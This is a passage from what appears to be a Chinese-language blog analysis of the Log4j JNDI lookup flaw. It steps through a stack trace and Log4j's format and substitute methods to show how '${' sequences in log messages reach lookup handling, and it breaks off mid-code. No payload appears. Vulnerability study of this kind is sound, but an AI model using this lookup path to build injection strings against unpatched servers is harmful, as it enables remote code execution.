</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>logging</span><span class=p>.</span><span class=na>log4j</span><span class=p>.</span><span class=na>spi</span><span class=p>.</span><span class=na>AbstractLogger</span><span class=p>.</span><span class=na>logMessage</span><span class=p>(</span><span class=n>AbstractLogger</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>1988</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>logging</span><span class=p>.</span><span class=na>log4j</span><span class=p>.</span><span class=na>spi</span><span class=p>.</span><span class=na>AbstractLogger</span><span class=p>.</span><span class=na>logIfEnabled</span><span class=p>(</span><span class=n>AbstractLogger</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>1960</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>logging</span><span class=p>.</span><span class=na>log4j</span><span class=p>.</span><span class=na>spi</span><span class=p>.</span><span class=na>AbstractLogger</span><span class=p>.</span><span class=na>error</span><span class=p>(</span><span class=n>AbstractLogger</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>723</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>Log4jTEst</span><span class=p>.</span><span class=na>main</span><span class=p>(</span><span class=n>Log4jTEst</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>7</span><span class=p>)</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>我没想到居然这么深，现在到了 format</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>format</span><span class=p>(</span><span class=n>LogEvent</span><span class=w> </span><span class=n>event</span><span class=p>,</span><span class=w> </span><span class=n>StringBuilder</span><span class=w> </span><span class=n>toAppendTo</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Message</span><span class=w> </span><span class=n>msg</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>event</span><span class=p>.</span><span class=na>getMessage</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>msg</span><span class=w> </span><span class=k>instanceof</span><span class=w> </span><span class=n>StringBuilderFormattable</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=kt>boolean</span><span class=w> </span><span class=n>doRender</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>textRenderer</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>StringBuilder</span><span class=w> </span><span class=n>workingBuilder</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>doRender</span><span class=w> </span><span class=o>?</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>StringBuilder</span><span class=p>(</span><span class=n>80</span><span class=p>)</span><span class=w> </span><span class=p>:</span><span class=w> </span><span class=n>toAppendTo</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>StringBuilderFormattable</span><span class=w> </span><span class=n>stringBuilderFormattable</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>StringBuilderFormattable</span><span class=p>)</span><span class=n>msg</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=kt>int</span><span class=w> </span><span class=n>offset</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>workingBuilder</span><span class=p>.</span><span class=na>length</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>stringBuilderFormattable</span><span class=p>.</span><span class=na>formatTo</span><span class=p>(</span><span class=n>workingBuilder</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=k>this</span><span class=p>.</span><span class=na>config</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=o>!</span><span class=k>this</span><span class=p>.</span><span class=na>noLookups</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>for</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>offset</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>workingBuilder</span><span class=p>.</span><span class=na>length</span><span class=p>()</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=n>1</span><span class=p>;</span><span class=w> </span><span class=o>++</span><span class=n>i</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>workingBuilder</span><span class=p>.</span><span class=na>charAt</span><span class=p>(</span><span class=n>i</span><span class=p>)</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=sc>&#39;$&#39;</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=n>workingBuilder</span><span class=p>.</span><span class=na>charAt</span><span class=p>(</span><span class=n>i</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>1</span><span class=p>)</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=sc>&#39;{&#39;</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                        </span><span class=n>String</span><span class=w> </span><span class=n>value</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>workingBuilder</span><span class=p>.</span><span class=na>substring</span><span class=p>(</span><span class=n>offset</span><span class=p>,</span><span class=w> </span><span class=n>workingBuilder</span><span class=p>.</span><span class=na>length</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                        </span><span class=n>workingBuilder</span><span class=p>.</span><span class=na>setLength</span><span class=p>(</span><span class=n>offset</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                        </span><span class=n>workingBuilder</span><span class=p>.</span><span class=na>append</span><span class=p>(</span><span class=k>this</span><span class=p>.</span><span class=na>config</span><span class=p>.</span><span class=na>getStrSubstitutor</span><span class=p>().</span><span class=na>replace</span><span class=p>(</span><span class=n>event</span><span class=p>,</span><span class=w> </span><span class=n>value</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>doRender</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>this</span><span class=p>.</span><span class=na>textRenderer</span><span class=p>.</span><span class=na>render</span><span class=p>(</span><span class=n>workingBuilder</span><span class=p>,</span><span class=w> </span><span class=n>toAppendTo</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>msg</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>String</span><span class=w> </span><span class=n>result</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>msg</span><span class=w> </span><span class=k>instanceof</span><span class=w> </span><span class=n>MultiformatMessage</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>result</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>((</span><span class=n>MultiformatMessage</span><span class=p>)</span><span class=n>msg</span><span class=p>).</span><span class=na>getFormattedMessage</span><span class=p>(</span><span class=k>this</span><span class=p>.</span><span class=na>formats</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>result</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>msg</span><span class=p>.</span><span class=na>getFormattedMessage</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>result</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>toAppendTo</span><span class=p>.</span><span class=na>append</span><span class=p>(</span><span class=k>this</span><span class=p>.</span><span class=na>config</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=n>result</span><span class=p>.</span><span class=na>contains</span><span class=p>(</span><span class=s>&#34;${&#34;</span><span class=p>)</span><span class=w> </span><span class=o>?</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>config</span><span class=p>.</span><span class=na>getStrSubstitutor</span><span class=p>().</span><span class=na>replace</span><span class=p>(</span><span class=n>event</span><span class=p>,</span><span class=w> </span><span class=n>result</span><span class=p>)</span><span class=w> </span><span class=p>:</span><span class=w> </span><span class=n>result</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>toAppendTo</span><span class=p>.</span><span class=na>append</span><span class=p>(</span><span class=s>&#34;null&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>负责处理日志消息的格式化和 JNDI 查找，我们主要看JNDI查找部分，会进行<code>$</code>以及<code>{</code>的匹配，为什么是这两个符号呢，因为这么写可以解决嵌套<code>${}</code>或循环引用的问题。接着跟进到 substitute</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>private</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=nf>substitute</span><span class=p>(</span><span class=n>LogEvent</span><span class=w> </span><span class=n>event</span><span class=p>,</span><span class=w> </span><span class=n>StringBuilder</span><span class=w> </span><span class=n>buf</span><span class=p>,</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>offset</span><span class=p>,</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>length</span><span class=p>,</span><span class=w> </span><span class=n>List</span><span class=o>&lt;</span><span class=n>String</span><span class=o>&gt;</span><span class=w> </span><span class=n>priorVariables</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>StrMatcher</span><span class=w> </span><span class=n>prefixMatcher</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>getVariablePrefixMatcher</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>StrMatcher</span><span class=w> </span><span class=n>suffixMatcher</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>getVariableSuffixMatcher</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>char</span><span class=w> </span><span class=n>escape</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>getEscapeChar</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>StrMatcher</span><span class=w> </span><span class=n>valueDelimiterMatcher</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>getValueDelimiterMatcher</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>boolean</span><span class=w> </span><span class=n>substitutionInVariablesEnabled</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>isEnableSubstitutionInVariables</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>boolean</span><span class=w> </span><span class=n>top</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>priorVariables</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>boolean</span><span class=w> </span><span class=n>altered</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>false</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>int</span><span class=w> </span><span class=n>lengthChange</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>0</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>char</span><span class=o>[]</span><span class=w> </span><span class=n>chars</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>getChars</span><span class=p>(</span><span class=n>buf</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>int</span><span class=w> </span><span class=n>bufEnd</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>offset</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>length</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>int</span><span class=w> </span><span class=n>pos</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>offset</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>while</span><span class=p>(</span><span class=n>pos</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>bufEnd</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=kt>int</span><span class=w> </span><span class=n>startMatchLen</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>prefixMatcher</span><span class=p>.</span><span class=na>isMatch</span><span class=p>(</span><span class=n>chars</span><span class=p>,</span><span class=w> </span><span class=n>pos</span><span class=p>,</span><span class=w> </span><span class=n>offset</span><span class=p>,</span><span class=w> </span><span class=n>bufEnd</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>startMatchLen</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=o>++</span><span class=n>pos</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>pos</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=n>offset</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=n>chars</span><span class=o>[</span><span class=n>pos</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=n>1</span><span class=o>]</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>escape</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>buf</span><span class=p>.</span><span class=na>deleteCharAt</span><span class=p>(</span><span class=n>pos</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=n>1</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>chars</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>getChars</span><span class=p>(</span><span class=n>buf</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=o>--</span><span class=n>lengthChange</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>altered</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>true</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=o>--</span><span class=n>bufEnd</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=kt>int</span><span class=w> </span><span class=n>startPos</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>pos</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>pos</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=n>startMatchLen</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=kt>int</span><span class=w> </span><span class=n>endMatchLen</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>0</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=kt>int</span><span class=w> </span><span class=n>nestedVarCount</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>0</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>while</span><span class=p>(</span><span class=n>pos</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>bufEnd</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>substitutionInVariablesEnabled</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=p>(</span><span class=n>endMatchLen</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>prefixMatcher</span><span class=p>.</span><span class=na>isMatch</span><span class=p>(</span><span class=n>chars</span><span class=p>,</span><span class=w> </span><span class=n>pos</span><span class=p>,</span><span class=w> </span><span class=n>offset</span><span class=p>,</span><span class=w> </span><span class=n>bufEnd</span><span class=p>))</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=n>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                        </span><span class=o>++</span><span class=n>nestedVarCount</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                        </span><span class=n>pos</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=n>endMatchLen</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                        </span><span class=n>endMatchLen</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>suffixMatcher</span><span class=p>.</span><span class=na>isMatch</span><span class=p>(</span><span class=n>chars</span><span class=p>,</span><span class=w> </span><span class=n>pos</span><span class=p>,</span><span class=w> </span><span class=n>offset</span><span class=p>,</span><span class=w> </span><span class=n>bufEnd</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>endMatchLen</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                            </span><span class=o>++</span><span class=n>pos</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                        </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>nestedVarCount</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                                </span><span class=n>String</span><span class=w> </span><span class=n>varNameExpr</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>String</span><span class=p>(</span><span class=n>chars</span><span class=p>,</span><span class=w> </span><span class=n>startPos</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>startMatchLen</span><span class=p>,</span><span class=w> </span><span class=n>pos</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=n>startPos</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=n>startMatchLen</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                                </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>substitutionInVariablesEnabled</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                                    </span><span class=n>StringBuilder</span><span class=w> </span><span class=n>bufName</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>StringBuilder</span><span class=p>(</span><span class=n>varNameExpr</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                                    </span><span class=k>this</span><span class=p>.</span><span class=na>substitute</span><span class=p>(</span><span class=n>event</span><span class=p>,</span><span class=w> </span><span class=n>bufName</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>bufName</span><span class=p>.</span><span class=na>length</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                                    </span><span class=n>varNameExpr</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>bufName</span><span class=p>.</span><span class=na>toString</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                                </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                                </span><span class=n>pos</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=n>endMatchLen</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                                </span><span class=n>String</span><span class=w> </span><span class=n>varName</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>varNameExpr</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                                </span><span class=n>String</span><span class=w> </span><span class=n>varDefaultValue</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>null</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                                </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>valueDelimiterMatcher</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                                    </span><span class=kt>char</span><span class=o>[]</span><span class=w> </span><span class=n>varNameExprChars</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>varNameExpr</span><span class=p>.</span><span class=na>toCharArray</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                                    </span><span class=kt>int</span><span class=w> </span><span class=n>valueDelimiterMatchLen</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>0</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
